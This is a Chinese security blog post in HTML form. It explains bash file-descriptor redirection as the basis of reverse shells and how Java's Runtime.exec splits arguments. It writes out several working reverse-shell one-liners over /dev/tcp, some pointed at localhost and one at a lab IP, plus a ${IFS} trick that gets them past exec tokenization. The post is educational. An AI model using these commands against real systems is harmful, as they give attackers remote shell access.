@@ -1,0 +1,2545 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="Sariel.D">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Sariel.D">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="笔记">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java 反弹 Shell">
+<meta property="og:url" content="https://blog.sari3l.com/posts/91ba290f/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="笔记">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="article:published_time" content="2020-03-02T14:47:18.000Z">
+<meta property="article:modified_time" content="2020-07-06T09:45:18.005Z">
+<meta property="article:author" content="Sariel.D">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <link rel="alternate" href="/atom.xml" title="Learning Man&#39;s Blog" type="application/atom+xml">
+    
+    <title>Java 反弹 Shell · Learning Man</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io@latest/css/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io@latest/scripts/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+    <script>
+        (function (i, s, o, g, r, a, m) {
+        i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+        (i[r].q = i[r].q || []).push(arguments)
+        }, i[r].l = 1 * new Date(); a = s.createElement(o),
+        m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+        })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+        ga('create', 'UA-129685149-2', 'auto');
+        ga('send', 'pageview');
+    </script>
+    
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-funky.css" type="text/css"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Learning Man&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Java 反弹 Shell</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Learning Man's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Java 反弹 Shell
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2.7k</span>阅读时长: <span class="post-count reading-time">13 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/03/02</span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <!--<img class="loading" src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/images/loading.gif" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        -->
+        <img class="loading" src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p>简单记忆: </p>
+<ul>
+<li><code>&gt;</code>可在<code>&amp;</code>前、后</li>
+<li><code>&lt;</code>只能在<code>&amp;</code>前</li>
+</ul>
+<h3 id="1-输入重定向"><a href="#1-输入重定向" class="headerlink" title="1. 输入重定向"></a>1. 输入重定向</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15828004794955.jpg" alt="-w693"></p>
+<pre class=" language-shell"><code class="language-shell">test@test:/tmp$ cat < test_file
+Hello World~</code></pre>
+<h3 id="2-输出重定向"><a href="#2-输出重定向" class="headerlink" title="2. 输出重定向"></a>2. 输出重定向</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15828006043413.jpg" alt="-w693"></p>
+<pre class=" language-shell"><code class="language-shell">test@test:/tmp$ echo 'Hello World~' > test_file 
+test@test:/tmp$ cat test_file 
+Hello World~</code></pre>
+<h3 id="3-标准输出与标准错误输出重定向"><a href="#3-标准输出与标准错误输出重定向" class="headerlink" title="3. 标准输出与标准错误输出重定向"></a>3. 标准输出与标准错误输出重定向</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15828006688727.jpg" alt="-w692"></p>
+<pre class=" language-shell"><code class="language-shell">// bash 1
+test@test:/tmp$ bash -i &> test
+
+// bash 2
+test@test:~$ ls -l /proc/5693/fd
+总用量 0
+lrwx------ 1 test test 64 2月  27 19:00 0 -> /dev/pts/2
+l-wx------ 1 test test 64 2月  27 19:00 1 -> /tmp/test
+l-wx------ 1 test test 64 2月  27 19:00 2 -> /tmp/test
+lrwx------ 1 test test 64 2月  27 19:00 255 -> /dev/tty</code></pre>
+<h3 id="4-文件描述符的复制"><a href="#4-文件描述符的复制" class="headerlink" title="4. 文件描述符的复制"></a>4. 文件描述符的复制</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15828014944337.jpg" alt="-w836"></p>
+<p>注意：</p>
+<ol>
+<li>两种形式都是将 word 复制给 n</li>
+<li>在第二种形式<code>&gt;&amp;</code>最后的描述中，如果没有指定<code>n</code>，且<code>word</code>无法解释成<code>整数</code>或<code>-</code>，则此命令会被解释为<code>标准输出与标准错误输出重定向</code></li>
+</ol>
+<p>根据此两点，如果<strong>n为数字，则解析为<code>文件描述符复制</code></strong></p>
+<hr>
+<p>这里还需要将<code>文件描述符的复制</code>与<code>标准输出与标准错误输出重定向</code>拿出来比较一番，注意下面<code>&gt;&amp;5</code>与<code>&amp;&gt;5</code>的区别</p>
+<p>即<code>&amp;</code>是否紧跟数字<code>n</code>，会区分为<code>文件描述符n</code>和<code>文件n</code></p>
+<ul>
+<li><code>&gt;&amp;5</code> -&gt; 将<code>文件描述符5</code>复制给<code>stdout</code></li>
+<li><code>&amp;&gt;5</code> -&gt; 将<code>stdout</code>、<code>stderr</code>重定向到<code>当前目录下名为5的文件</code></li>
+</ul>
+<pre class=" language-shell"><code class="language-shell">test@test:/tmp$ exec 5<>test_file >&5
+
+test@test:~$ ls -l /proc/14396/fd
+总用量 0
+lrwx------ 1 test test 64 2月  29 14:16 0 -> /dev/pts/0
+lrwx------ 1 test test 64 2月  29 14:16 1 -> /tmp/test_file
+lrwx------ 1 test test 64 2月  29 14:16 2 -> /dev/pts/0
+lrwx------ 1 test test 64 2月  29 14:16 255 -> /dev/pts/0
+lrwx------ 1 test test 64 2月  29 14:16 5 -> /tmp/test_file
+
+---
+
+test@test:/tmp$ exec 5<>test_file &>5
+
+test@test:~$ ls -l /proc/14396/fd
+总用量 0
+lrwx------ 1 test test 64 2月  29 14:16 0 -> /dev/pts/0
+l-wx------ 1 test test 64 2月  29 14:16 1 -> /tmp/5
+l-wx------ 1 test test 64 2月  29 14:16 2 -> /tmp/5
+lrwx------ 1 test test 64 2月  29 14:16 255 -> /dev/pts/0
+lrwx------ 1 test test 64 2月  29 14:16 5 -> /tmp/test_file</code></pre>
+<h3 id="5-打开文件描述符进行读写"><a href="#5-打开文件描述符进行读写" class="headerlink" title="5. 打开文件描述符进行读写"></a>5. 打开文件描述符进行读写</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15828164328837.jpg" alt="-w841"></p>
+<blockquote>
+<p>当exec命令对文件描述符操作的时候，就不会替换shell，而是操作完成后还会继续执行后面的命令</p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">test@test:/tmp$ 5<>file
+
+test@test:/tmp$ ls -l /proc/29753/fd
+总用量 0
+lrwx------ 1 test test 64 2月  29 12:04 0 -> /dev/pts/1
+lrwx------ 1 test test 64 2月  29 12:04 1 -> /dev/pts/1
+lrwx------ 1 test test 64 2月  29 12:04 2 -> /dev/pts/1
+lrwx------ 1 test test 64 2月  29 12:04 255 -> /dev/pts/1
+
+---
+test@test:/tmp$ exec 5<>test_file
+
+test@test:/tmp$ ls -l /proc/29753/fd
+总用量 0
+lrwx------ 1 test test 64 2月  29 12:04 0 -> /dev/pts/1
+lrwx------ 1 test test 64 2月  29 12:04 1 -> /dev/pts/1
+lrwx------ 1 test test 64 2月  29 12:04 2 -> /dev/pts/1
+lrwx------ 1 test test 64 2月  29 12:04 255 -> /dev/pts/1
+lrwx------ 1 test test 64 2月  29 12:04 5 -> /tmp/test_file</code></pre>
+<h2 id="反弹"><a href="#反弹" class="headerlink" title="反弹"></a>反弹</h2><h3 id="文件描述符复制"><a href="#文件描述符复制" class="headerlink" title="文件描述符复制"></a>文件描述符复制</h3><p>最常见的模式</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345 0<span class="token operator">></span><span class="token operator">&amp;</span>1
+
+// 省略非必要空格
+<span class="token function">bash</span> -i<span class="token operator">></span><span class="token operator">&amp;</span>/dev/tcp/127.0.0.1/12345 0<span class="token operator">></span><span class="token operator">&amp;</span>1</code></pre>
+<h3 id="文件描述符复制-2"><a href="#文件描述符复制-2" class="headerlink" title="文件描述符复制 2"></a>文件描述符复制 2</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345 <span class="token operator">&lt;</span><span class="token operator">&amp;</span>1
+
+// 省略非必要空格
+<span class="token function">bash</span> -i<span class="token operator">></span><span class="token operator">&amp;</span>/dev/tcp/127.0.0.1/12345<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1</code></pre>
+<h3 id="绑定重定向"><a href="#绑定重定向" class="headerlink" title="绑定重定向"></a>绑定重定向</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">exec</span> 5<span class="token operator">&lt;</span><span class="token operator">></span>/dev/tcp/192.168.146.129/2333<span class="token punctuation">;</span><span class="token function">cat</span> <span class="token operator">&lt;</span><span class="token operator">&amp;</span>5<span class="token operator">|</span><span class="token keyword">while</span> <span class="token function">read</span> line<span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token variable">$line</span> <span class="token operator">></span><span class="token operator">&amp;</span>5 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span class="token punctuation">;</span><span class="token keyword">done</span></code></pre>
+<p>注意为什么最后又加了一个<code>2&gt;&amp;1</code>呢？回头看看描述符复制注意的地方，就清楚了</p>
+<hr>
+<p>另外下面为什么没看到<code>进程30651的bash</code>中<code>stdout &amp; stderr</code>被重定向情况呢？因为每次<code>do</code>都是通过<strong>此bash</strong>新开启一个子进程，并在子进程内进行文件描述符的赋值</p>
+<pre class=" language-shell"><code class="language-shell">test@test:~$ exec 5<>/dev/tcp/127.0.0.1/12345;cat <&5|while read line;do $line >&5 2>&1;done
+
+// 29753 执行反弹 shell 命令
+test     29753  4841  0 12:04 pts/1    00:00:00 bash
+test     30640  4895  0 12:09 pts/2    00:00:00 nc -lvvp 12345
+test     30650 29753  0 12:09 pts/1    00:00:00 cat
+test     30651 29753  0 12:09 pts/1    00:00:00 bash
+
+// cat
+test@test:/tmp$ ls -l /proc/30650/fd
+总用量 0
+lrwx------ 1 test test 64 2月  29 12:48 0 -> 'socket:[1487308]'
+l-wx------ 1 test test 64 2月  29 12:48 1 -> 'pipe:[1487309]'
+lrwx------ 1 test test 64 2月  29 12:48 2 -> /dev/pts/1
+lrwx------ 1 test test 64 2月  29 12:48 5 -> 'socket:[1487308]'
+
+// bash
+test@test:/tmp$ ls -l /proc/30651/fd
+总用量 0
+lr-x------ 1 test test 64 2月  29 12:48 0 -> 'pipe:[1487309]'
+lrwx------ 1 test test 64 2月  29 12:48 1 -> /dev/pts/1
+lrwx------ 1 test test 64 2月  29 12:48 2 -> /dev/pts/1
+lrwx------ 1 test test 64 2月  29 12:48 255 -> /dev/pts/1
+lrwx------ 1 test test 64 2月  29 12:48 5 -> 'socket:[1487308]'</code></pre>
+<h4 id="额外的例子"><a href="#额外的例子" class="headerlink" title="额外的例子"></a>额外的例子</h4><p><code>&lt;&amp;996 &gt;&amp;996 2&gt;&amp;996</code>分别对应复制到<code>stdin stdout stderr</code></p>
+<pre class=" language-shell"><code class="language-shell">0<&996;exec 996<>/dev/tcp/127.0.0.1/12345;sh <&996 >&996 2>&996
+
+// 变形
+exec 996<>/dev/tcp/127.0.0.1/123450 <&996 >&996 2>&996</code></pre>
+<p>注意：变形的命令在连接端退出会导致此端同时退出，原因如下：</p>
+<pre class=" language-shell"><code class="language-shell">// 0<&996;exec 996<>/dev/tcp/127.0.0.1/12345;sh <&996 >&996 2>&996
+test     18999  2516  0 14:44 pts/0    00:00:00 bash
+
+test@test:~$ ls -l /proc/18999/fd
+总用量 0
+lrwx------ 1 test test 64 2月  29 14:44 0 -> 'socket:[106812]'
+lrwx------ 1 test test 64 2月  29 14:44 1 -> 'socket:[106812]'
+lrwx------ 1 test test 64 2月  29 14:45 196 -> 'socket:[106812]'
+lrwx------ 1 test test 64 2月  29 14:44 2 -> 'socket:[106812]'
+lrwx------ 1 test test 64 2月  29 14:44 255 -> /dev/pts/0
+
+---
+
+// exec 996<>/dev/tcp/127.0.0.1/123450 <&996 >&996 2>&996
+test     18999  2516  0 14:44 pts/0    00:00:00 bash
+test     20566 18999  0 14:53 pts/0    00:00:00 sh
+
+test@test:~$ ls -l /proc/18999/fd
+总用量 0
+lrwx------ 1 test test 64 2月  29 14:44 0 -> /dev/pts/0
+lrwx------ 1 test test 64 2月  29 14:44 1 -> /dev/pts/0
+lrwx------ 1 test test 64 2月  29 14:45 196 -> 'socket:[105103]'
+lrwx------ 1 test test 64 2月  29 14:44 2 -> /dev/pts/0
+lrwx------ 1 test test 64 2月  29 14:44 255 -> /dev/pts/0
+test@test:~$ ls -l /proc/20566/fd
+总用量 0
+lrwx------ 1 test test 64 2月  29 14:53 0 -> 'socket:[105103]'
+lrwx------ 1 test test 64 2月  29 14:53 1 -> 'socket:[105103]'
+lrwx------ 1 test test 64 2月  29 14:53 196 -> 'socket:[105103]'
+lrwx------ 1 test test 64 2月  29 14:53 2 -> 'socket:[105103]'</code></pre>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15829596110947.jpg" alt="https://xz.aliyun.com/t/2549#toc-8"></p>
+<h2 id="反弹-in-Java"><a href="#反弹-in-Java" class="headerlink" title="反弹 in Java"></a>反弹 in Java</h2><h3 id="Runtime-getRuntime-exec"><a href="#Runtime-getRuntime-exec" class="headerlink" title="Runtime.getRuntime().exec"></a>Runtime.getRuntime().exec</h3><h4 id="exec-new-String"><a href="#exec-new-String" class="headerlink" title="exec(new String[])"></a>exec(new String[])</h4><p>在此模式解析的关键是<code>java.lang.UNIXProcess#UNIXProcess</code>，在<code>-c</code>模式下，可以看到参数为两个</p>
+<p>P.S. 个人认为是因为如<code>&gt;&amp;</code>等参数无法被识别为bash参数，它应属于当前 bash 环境下的操作</p>
+<ol>
+<li><p>直接数组化无法解析，解析参数为 4 个</p>
+<p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15816475716996.jpg" alt="-w1640"><br> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15840206558058.jpg" alt="-w1005"></p>
+</li>
+<li><p>数组化 with <code>-c</code>能正确解析，解析参数为 2 个</p>
+<p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15816478550627.jpg" alt="-w1680"><br> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15816487793325.jpg" alt="-w996"></p>
+</li>
+</ol>
+<h4 id="exec-new-String-1"><a href="#exec-new-String-1" class="headerlink" title="exec(new String)"></a>exec(new String)</h4><p>如果我们只传入一个字符串时，会经过 StringTokenizer 分割，注意会识别<strong>五个</strong>字符</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15816481561408.jpg" alt="-w537"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15816521932598.jpg" alt="-w631"></p>
+<p>所以我们需要找到一个字符能够绕过分割且能被<code>/bin/bash</code>正确识别为空格</p>
+<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="IFS"><a href="#IFS" class="headerlink" title="${IFS}"></a>${IFS}</h3><blockquote>
+<p>一般情况下，<code>$var</code>与<code>${var}</code>并没有啥不一样。但是用<code>${ }</code>会比较精确的界定变量名称的范围</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15816540712094.jpg" alt="-w489"></p>
+<p>如果直接利用会报错<code>ambiguous redirect(歧义重定向)</code></p>
+<pre class=" language-shell"><code class="language-shell"># 报错 ambiguous redirect
+bash-3.2$ bash${IFS}-i${IFS}>&${IFS}/dev/tcp/127.0.0.1/12345${IFS}0>&1
+bash: ${IFS}/dev/tcp/127.0.0.1/12345${IFS}0: ambiguous redirect
+
+# 正常
+bash-3.2$ bash${IFS}-i${IFS}>&${IFS}/dev/tcp/127.0.0.1/12345 0>&1</code></pre>
+<p>那么最后一个空格该如何处理呢，我们可以看到，经过<code>&gt;&amp; socks</code>后，stdou stderr 已经被重定向到了 socks 文件，最后一句<code>0&gt;&amp;1</code>就是试图将 stdin 也重定向过去</p>
+<pre class=" language-bash"><code class="language-bash">test@test:~$ <span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345
+
+test@test:~$ <span class="token function">ls</span> -l /proc/14067/fd
+总用量 0
+lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2月  27 23:05 0 -<span class="token operator">></span> /dev/pts/1
+lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2月  27 23:05 1 -<span class="token operator">></span> <span class="token string">'socket:[924955]'</span>
+lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2月  27 23:05 10 -<span class="token operator">></span> /dev/tty
+lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2月  27 23:05 2 -<span class="token operator">></span> <span class="token string">'socket:[924955]'</span></code></pre>
